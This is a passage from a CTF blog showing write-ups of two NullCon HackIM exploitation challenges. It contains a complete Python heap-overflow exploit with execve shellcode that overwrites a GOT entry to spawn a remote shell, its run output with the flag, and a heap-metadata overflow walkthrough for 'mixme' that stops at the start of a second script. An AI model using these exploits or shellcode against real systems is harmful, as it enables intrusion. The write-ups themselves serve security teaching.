<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;54.163.248.69&#39;</span><span class="p">,</span> <span class="mi">9004</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span>  <span class="o">=</span> <span class="s">&quot;1</span><span class="se">\n</span><span class="s">1</span><span class="se">\n</span><span class="s">1</span><span class="se">\n</span><span class="s">1</span><span class="se">\n</span><span class="s">&quot;</span>   <span class="c"># create two notes of type one</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;3</span><span class="se">\n</span><span class="s">0</span><span class="se">\n</span><span class="s">2</span><span class="se">\n</span><span class="s">&quot;</span>      <span class="c"># edit note 0 as type two</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overflow note to line up to heap pointer</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">212</span><span class="o">+</span><span class="s">&quot;BBB</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># leak heap addr</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Trying to leaking heap address...&quot;</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;4</span><span class="se">\n</span><span class="s">0</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ugly.. but works :/</span>
</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;.*BBB\n(....).*&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="n">m</span><span class="p">:</span>
</span><span class='line'>  <span class="n">heap</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked heap address at {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">))</span>
</span><span class='line'>  <span class="c"># offset for shellcode found empirically via gdb</span>
</span><span class='line'>  <span class="n">shellcode</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">-</span> <span class="mh">0xd0</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Shellcode at {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[!] Fatal: could not leak heap address&quot;</span>
</span><span class='line'>  <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Sending new notes to overwrite got pointer...&quot;</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">1</span><span class="se">\n</span><span class="s">1</span><span class="se">\n</span><span class="s">1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>    <span class="c"># create two more notes</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># send new note to overflow pointers</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;3</span><span class="se">\n</span><span class="s">2</span><span class="se">\n</span><span class="s">2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">sc</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'><span class="c"># prepend shellcode with a little NOP sled</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">212</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sc</span>
</span><span class='line'><span class="c"># overwrite note_info struct</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804b024</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>     <span class="c"># __isoc99_scanf@got.plt-8</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>       <span class="c"># heap location of shellcode</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># request deletion of a note, triggering our write-what-where</span>
</span><span class='line'><span class="c"># we overwrite a function pointer in the got with the location</span>
</span><span class='line'><span class="c"># of our shellcode</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;2</span><span class="se">\n</span><span class="s">3</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># shell incoming!</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Enjoy your shell!&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bas</span><span class="nd">@tritonal</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="o">/</span><span class="n">nullcon</span><span class="o">/</span><span class="n">exp400</span><span class="err">$</span> <span class="n">python</span> <span class="n">sploit</span><span class="o">.</span><span class="n">py</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">leaking</span> <span class="n">heap</span> <span class="n">address</span><span class="o">...</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">heap</span> <span class="n">address</span> <span class="n">at</span> <span class="mh">0x85cf1d0</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Shellcode</span> <span class="n">at</span> <span class="mh">0x85cf100</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">new</span> <span class="n">notes</span> <span class="n">to</span> <span class="n">overwrite</span> <span class="n">got</span> <span class="n">pointer</span><span class="o">...</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Enjoy</span> <span class="n">your</span> <span class="n">shell</span><span class="err">!</span>
</span><span class='line'><span class="nb">id</span>
</span><span class='line'><span class="o">/</span><span class="nb">bin</span><span class="o">//</span><span class="n">sh</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> <span class="nb">id</span><span class="p">:</span> <span class="ow">not</span> <span class="n">found</span>
</span><span class='line'><span class="n">cat</span> <span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
</span><span class='line'><span class="n">flag</span><span class="p">{</span><span class="n">y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag was <code>flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - Mixme]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup/"/>
    <updated>2015-01-11T18:52:35+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup</id>
    <content type="html"><![CDATA[<p><code>mixme</code> was a 400 points exploitation challenge of the NullCon HackIM ctf. We solved it with just 20 minutes on the clock!</p>

<!-- more -->


<p>When started, <code>mixme</code> present the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>==========================================
</span><span class='line'>======== Uncle Podger's Data Store =======
</span><span class='line'>==========================================
</span><span class='line'>
</span><span class='line'>Select op (store/get/edit/exit): store
</span><span class='line'>Name: a
</span><span class='line'>Size: 4
</span><span class='line'>Enter data: AAAA
</span><span class='line'>Select op (store/get/edit/exit): get
</span><span class='line'>Name: a
</span><span class='line'>Size: 4
</span><span class='line'>AAAASelect op (store/get/edit/exit): get
</span><span class='line'>Name: a
</span><span class='line'>Size: 4
</span><span class='line'>Not found
</span><span class='line'>Select op (store/get/edit/exit): Invalid input
</span><span class='line'>Select op (store/get/edit/exit): </span></code></pre></td></tr></table></div></figure>


<p>Again, some kind of note storage. The binary was first reverse-engineered by superkojiman, who immediately noticed something odd: upon <code>get</code>ing a note, the program erases the note by <code>free()</code>ing the memory and NULLing the first few bytes. The rest of the bytes were left intact. This led us to think about possible use-after-free scenarios. Turns out it was something different&hellip;</p>

<p>I started tinkering with the binary. I could store notes and get them back, but only if I supplied the right size. However, I noticed that I could <em>edit</em> a note with a larger value than was allocated. The heap looks like this after allocating three notes <code>a</code>, <code>b</code> and <code>c</code> with length 4 and contents <code>AAAA</code>, <code>BBBB</code>, and <code>CCCC</code>, respectively:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># allocated three notes, in heap:
</span><span class='line'>0x8314000:    0x00000000  0x00000029  0x44414548  0x00000000
</span><span class='line'>0x8314010:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8314020:    0x08314030  0x083140a0  0x00000000  0x00000029
</span><span class='line'>0x8314030:    0x00000061  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8314040:    0x00000004  0x08314058  0x08314068  0x08314008
</span><span class='line'>0x8314050:    0x00000000  0x00000011  0x41414141  0x00000000
</span><span class='line'>0x8314060:    0x00000000  0x00000029  0x00000062  0x00000000
</span><span class='line'>0x8314070:    0x00000000  0x00000000  0x00000004  0x08314090
</span><span class='line'>0x8314080:    0x083140a0  0x08314030  0x00000000  0x00000011
</span><span class='line'>0x8314090:    0x42424242  0x00000000  0x00000000  0x00000029
</span><span class='line'>0x83140a0:    0x00000063  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x83140b0:    0x00000004  0x083140c8  0x08314008  0x08314068
</span><span class='line'>0x83140c0:    0x00000000  0x00000011  0x43434343  0x00000000
</span><span class='line'>0x83140d0:    0x00000000  0x00020f31  0x00000000  0x00000000
</span><span class='line'>0x83140e0:    0x00000000  0x00000000  0x00000000  0x00000000</span></code></pre></td></tr></table></div></figure>


<p>At <code>0x8314030</code>, we see the first note&rsquo;s name, <code>a</code>. The zeroeth note is called <code>HEAD</code> and precedes our first note. Each note is contained within a struct, which contains pointers to the previous and next note (a doubly linked list). The meta-data for note <code>a</code> contains this pointer: <code>0x08314058</code>, which points to the data associated with that note: <code>AAAA</code>. The meta-data for the note looks something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">note_info</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">content</span><span class="p">;</span>
</span><span class='line'>  <span class="n">note_info</span> <span class="o">*</span><span class="n">next_note</span><span class="p">;</span>
</span><span class='line'>  <span class="n">note_info</span> <span class="o">*</span><span class="n">prev_note</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>This also is true for the next note, <code>b</code>, which is immediately after <code>a</code> in memory. We can overwrite the meta-data of note <code>b</code> by editing note <code>a</code>.</p>

<h2>Overflowing the heap</h2>

<p>If we supply 40 bytes when editing <code>a</code> and supplying forty times <code>0x41</code>, we overwrite several parts of the meta-data of note <code>b</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp"># after editing &#39;a&#39; with 40 bytes where 4 is allocated:</span>
</span><span class='line'><span class="mh">0x8314000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x44414548</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314010</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314020</span><span class="o">:</span> <span class="mh">0x083140a0</span>  <span class="mh">0x083140a0</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x8314030</span><span class="o">:</span> <span class="mh">0x00000061</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314040</span><span class="o">:</span> <span class="mh">0x00000004</span>  <span class="mh">0x08314058</span>  <span class="mh">0x08314068</span>  <span class="mh">0x08314008</span>
</span><span class='line'><span class="mh">0x8314050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8314060</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8314070</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8314080</span><span class="o">:</span> <span class="mh">0x083140a0</span>  <span class="mh">0x08314008</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>
</span><span class='line'><span class="mh">0x8314090</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x83140a0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x83140b0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x083140c8</span>  <span class="mh">0x08314008</span>  <span class="mh">0x08314008</span>
</span><span class='line'><span class="mh">0x83140c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>  <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x83140d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00020f31</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x83140e0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>If we now try to <code>get</code> note <code>b</code>, the binary will segfault because the pointer to the note&rsquo;s data is set to <code>0x41414141</code>. We can use this to make note <code>b</code> point to <code>free@got</code> with a bit of python. The binary is started using socat to make it listen on a port.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp"># set &#39;a&#39; with large buffer, overwriting meta-data of &#39;b&#39;:</span>
</span><span class='line'><span class="mh">0x8314000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x44414548</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314010</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314020</span><span class="o">:</span> <span class="mh">0x083140a0</span>  <span class="mh">0x083140a0</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x8314030</span><span class="o">:</span> <span class="mh">0x00000061</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x8314040</span><span class="o">:</span> <span class="mh">0x00000004</span>  <span class="mh">0x08314058</span>  <span class="mh">0x08314068</span>  <span class="mh">0x08314008</span>
</span><span class='line'><span class="mh">0x8314050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8314060</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000062</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x8314070</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x00000024</span>  <span class="mh">0x08314090</span>
</span><span class='line'><span class="mh">0x8314080</span><span class="o">:</span> <span class="mh">0x083140a0</span>  <span class="mh">0x08314008</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>
</span><span class='line'><span class="mh">0x8314090</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x83140a0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x83140b0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x083140c8</span>  <span class="mh">0x08314008</span>  <span class="mh">0x08314008</span>
</span><span class='line'><span class="mh">0x83140c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000011</span>  <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x83140d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00020f31</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x83140e0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>Notice that I&rsquo;ve kept the bytes at <code>0x8314064</code> and <code>0x8314068</code> the same: <code>0x00000029 0x00000062</code>. If these are overwritten, then the binary cannot find note <code>b</code> anymore, which effectively stops our attack! I overwrote the pointer to the data with <code>0x804b020</code>. This is the pointer to <code>free()</code> in the Global Offset Table. Remember, after every <code>get</code> sent to the binary, <code>free()</code> is called. By overwriting the pointer to the note data, we can set any memory to arbitrary values with an <code>edit b</code> command to the binary!</p>

<h2>Control of execution</h2>

<p>I tested this hypothesis with the following python:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">string</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
